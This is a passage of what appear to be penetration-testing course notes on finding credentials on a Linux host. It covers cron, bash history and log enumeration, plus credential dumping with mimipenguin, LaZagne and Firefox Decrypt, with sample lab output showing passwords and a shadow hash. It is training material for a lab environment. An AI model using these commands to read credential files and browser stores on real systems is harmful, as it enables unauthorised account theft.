<SNIP>
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh
```

##### Enumerating Cronjobs

Cronjobs are independent execution of commands, programs, or scripts. These are divided into the system-wide are (_```/etc/crontab```_) and user-dependent executions. Some apps and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (_daily, hourly, monthly, weekly_). The scripts and files used by cron can also be found in ```/etc/cron.d``` for Debian-based distros.

```bash
d41y@htb[/htb]$ cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
d41y@htb[/htb]$ ls -la /etc/cron.*/

/etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
<SNIP>
```

##### Enumerating History Files

All history files provide crucial information about the current and past/historical course of processes. You are interested in the files that store users' command history and the logs that store information about system processes.

In the history of the commands entered on Linx distros that use Bash as a standard shell, you find the associated files in ```.bash_history```. Nevertheless, other files like ```.bashrc``` or ```.bash_profile``` can contain important information.

```bash
d41y@htb[/htb]$ tail -n5 /home/*/.bash*

==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

==> /home/cry0l1t3/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

##### Enumerating Log Files

An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, you find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories:

- Application logs
- Event logs
- Service logs
- System logs

Many different logs exist on the system. These can vary depending on the apps installed, but here are some of the most important ones:

| File | Description |
| ---- | ----------- |
| ```/var/log/messages``` | generic system activity logs |
| ```/var/log/syslog``` | generic system activity logs |
| ```/var/log/auth.log``` | all authentication related logs (_Debian_) |
| ```/var/log/secure``` | all authentication related logs (_RedHat/CentOS_) |
| ```/var/log/boot.log``` | booting information |
| ```/var/log/dmesg``` | hardware and drivers related information and logs |
| ```/var/log/kern.log``` | kernel related warnings, errors and logs |
| ```/var/log/faillog``` | failed login attempts |
| ```/var/log/cron``` | information related to cron jobs |
| ```/var/log/mail.log``` | all mail server related logs |
| ```/var/log/httpd``` | all Apache related logs |
| ```/var/log/mysqld.log``` | all MySQL server related logs |

```bash
d41y@htb[/htb]$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

#### Log file:  /var/log/dpkg.log.1
2022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 <none> 
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1
<SNIP>
```

#### Memory and Cache

##### Mimipenguin

Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distros. there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.

```bash
d41y@htb[/htb]$ sudo python3 mimipenguin.py

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY
```

##### LaZagne

The passwords and hashes you can obtain come from the following sources but are not limited to:

- Wifi
- Wpa_supplicant
- Libsecret
- Kwallet
- Chromium-based
- CLI
- Mozilla
- Thunderbird
- Git
- ENV variables
- Grub
- Fstab
- AWS
- Filezilla
- Gftp
- SSH
- Apache
- Shadow
- Docker
- Keepass
- Mimipy
- Sessions
- Keyrings

For example, keyrings are used for secure storage and management of passwords on Linux distros. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager.

```bash
d41y@htb[/htb]$ sudo python2.7 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::

[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
```

##### Browser Credentials

Browsers store the passwords saved by the user in an encrypted from locally on the system to be reused. For example, the Mozilla Firefox browser stores the credentials encrypted in a hidden folder for the respective user. These often include the associated field names, URLs, and other valuable information.

For example, when you store credentials for a web page in the Firefox browser, they are encrypted and stored in ```logins.json``` on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.

```bash
[!bash]$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default

d41y@htb[/htb]$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly.

```bash
d41y@htb[/htb]$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

Alternatively, LaZagne can also return results if the user has used the supported browser.

```bash
d41y@htb[/htb]$ python3 laZagne.py browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
```

## Extracting Passwords from the Network

